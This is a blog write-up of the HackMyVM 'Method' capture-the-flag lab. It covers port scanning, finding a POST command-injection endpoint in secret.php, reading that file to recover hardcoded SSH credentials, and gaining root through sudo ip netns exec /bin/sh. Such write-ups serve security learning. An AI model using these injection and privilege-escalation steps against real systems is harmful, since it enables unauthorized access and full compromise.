---
layout: post
title: "HackMyVM - Method"
date: 2021-10-28 21:33:00 +0100
categories: hmv
tag: ["RCE"]
---

Creator: [avijneyam](https://hackmyvm.eu/profile/?user=avijneyam)
Level: Easy
Release Date: 2021-10-25

## Scan

```bash
nmap -sC -sV -p- 192.168.1.236
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-28 16:29 WEST
Nmap scan report for 192.168.1.236
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 4b:24:34:1f:41:10:88:b7:5a:6a:63:d9:f6:75:26:6f (RSA)
|   256 52:46:e7:20:68:c1:6f:90:2f:a6:ad:ee:6d:87:e7:28 (ECDSA)
|_  256 3f:ce:97:a9:1e:f4:60:f4:0e:71:e7:46:58:28:71:f0 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Test Page for the Nginx HTTP Server on Fedora
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
```

## Enumeration

```bash
dirsearch -u http://192.168.1.236 -e /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 404
```

```bash
  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                                                
                                                                                                                                                                       
Extensions: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Target: http://192.168.1.236/

[16:40:58] Starting: 
[16:41:36] 200 -  344B  - /index.htm                                        
[16:41:56] 200 -  285B  - /sitemap.xml                                      
                                                                             
Task Completed                      
```

### Web Page

```
http://192.168.1.236/index.htm
```

<img src="https://drive.google.com/uc?id=1QiyjCgUXhk2MWSiRnCAC9-omsyvhZkFI"/>

```bash
curl 'http://192.168.1.236/secret.php?HackMyVM=id'
Now the main part what it is loooooool<br>Try other method 
```

* Change method to POST

```bash
curl -X POST 'http://192.168.1.236/secret.php' -d 'HackMyVM=id' -H 'Content-Type: application/x-www-form-urlencoded'
You Found ME : - (<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

* Read **secret.php**

```bash
curl -X POST 'http://192.168.1.236/secret.php' -d 'HackMyVM=cat secret.php' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

```html
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.1.236:80...
* Connected to 192.168.1.236 (192.168.1.236) port 80 (#0)
> POST /secret.php HTTP/1.1
> Host: 192.168.1.236
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 23
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.18.0
< Date: Sat, 02 Apr 2022 16:09:08 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
You Found ME : - (<pre><?php
if(isset($_GET['HackMyVM'])){
        echo "Now the main part what it is loooooool";
        echo "<br>";
echo "Try other method";
        die;
}
if(isset($_POST['HackMyVM'])){
        echo "You Found ME : - (";
        echo "<pre>";
        $cmd = ($_POST['HackMyVM']);
        system($cmd);
        echo "</pre>";
        die;
}
else {
header("Location: https://images-na.ssl-images-amazon.com/images/I/31YDo0l4ZrL._SX331_BO1,204,203,200_.jpg");
}
$ok="prakasaka:th3-!llum!n@t0r";
?>
* Connection #0 to host 192.168.1.236 left intact
</pre>                                 
```

## ROOT 

### SSH

```bash
ssh prakasaka@192.168.1.236   
prakasaka@method:~$
```

### SUID /bin/ip - [ip](https://gtfobins.github.io/gtfobins/ip/#sudo)

```bash
sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo
```

```bash
prakasaka@method:~$ sudo ip netns add foo
[sudo] password for prakasaka: 
prakasaka@method:~$ sudo ip netns exec foo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```